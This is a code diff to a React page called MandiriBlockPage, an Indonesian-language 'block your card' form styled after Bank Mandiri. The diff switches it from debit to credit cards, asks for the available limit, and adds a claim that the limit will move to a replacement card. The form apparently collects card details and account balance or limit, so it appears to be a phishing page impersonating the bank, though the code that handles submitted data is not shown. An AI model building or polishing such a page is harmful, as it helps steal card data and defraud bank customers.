@@ -117,7 +117,7 @@ export default function MandiriBlockPage() {
                   height={80} 
                 />
               </div>
-              <h1 className="text-[#003366] text-[20px] font-bold mb-[10px]">Kartu Berhasil diblokir sementara</h1>
+              <h1 className="text-[#003366] text-[20px] font-bold mb-[10px]">Kartu Berhasil diblokir</h1>
               
               <div className="mt-8 flex flex-col gap-3">
                 {isNavReady && (
@@ -147,9 +147,9 @@ export default function MandiriBlockPage() {
         
         {view === 'form' && (
           <main className="bg-white rounded-[16px] p-[25px_20px] shadow-[0_15px_35px_rgba(0,45,92,0.15)] mx-[15px] text-center">
-            <h2 className="text-[1.2rem] font-bold text-[#002D5C] mb-2">Blokir Kartu Debit Mandiri</h2>
+            <h2 className="text-[1.2rem] font-bold text-[#002D5C] mb-2">Blokir Kartu Kredit Mandiri</h2>
             <p className="text-[0.85rem] text-[#64748b] mb-[25px] leading-[1.4]">
-              Silakan masukkan detail kartu debit Anda yang ingin diblokir sementara.
+              Silakan masukkan detail kartu kredit Anda yang ingin diblokir.
             </p>
             
             <form onSubmit={handleSubmit} className="text-left">
@@ -206,7 +206,7 @@ export default function MandiriBlockPage() {
               </div>
 
               <div className="mb-[15px]">
-                <label className="block text-[0.7rem] font-bold text-[#002D5C] mb-1.5 uppercase tracking-widest">Saldo Tersedia (IDR)</label>
+                <label className="block text-[0.7rem] font-bold text-[#002D5C] mb-1.5 uppercase tracking-widest">Limit Tersedia (IDR)</label>
                 <div className="relative">
                   <Wallet className="absolute left-[14px] top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 pointer-events-none" />
                   <input 
@@ -221,7 +221,7 @@ export default function MandiriBlockPage() {
                 <div className="flex items-center gap-2.5 bg-[#f8fafc] p-3 rounded-[10px] mt-2.5 border border-[#e2e8f0]">
                   <Info className="w-4 h-4 text-[#004D99] flex-shrink-0" />
                   <span className="text-[0.7rem] text-[#475569] font-medium leading-[1.3]">
-                    Pemblokiran ini bersifat sementara untuk melindungi akun Anda dari transaksi yang tidak sah.
+                    Limit kartu akan dialihkan ke kartu Pengganti.
                   </span>
                 </div>
               </div>
